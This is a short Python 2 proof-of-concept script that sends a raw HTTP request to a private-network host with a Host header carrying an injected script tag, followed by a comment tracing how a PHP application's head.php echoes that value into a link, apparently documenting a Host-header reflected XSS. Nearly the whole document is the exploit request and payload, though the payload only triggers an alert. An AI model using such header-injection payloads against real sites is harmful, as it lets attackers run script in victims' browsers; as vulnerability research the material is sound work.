from socket import *

s = socket(AF_INET, SOCK_STREAM)
s.connect(('192.168.32.38', 80))

req = "GET http://192.168.32.38/ HTTP/1.1\nHost: \"></a><script>alert(\"hello\");</script><a href=\"<?php echo $_SERVER['SERVER_NAME'] ?>\"\n\n"


s.send(req)
print s.recv(1024)

'''
common.php
	g5_path()

config.php
	G5_URL

head.php
<a href="<?php echo G5_URL ?>"><img src="<?php echo G5_IMG_URL ?>/logo.jpg" alt="<?php echo $config['cf_title']; ?>"></a>

"></a><script>alert("hello");</script><a href="<?php echo $_SERVER['SERVER_NAME'] ?>
'''
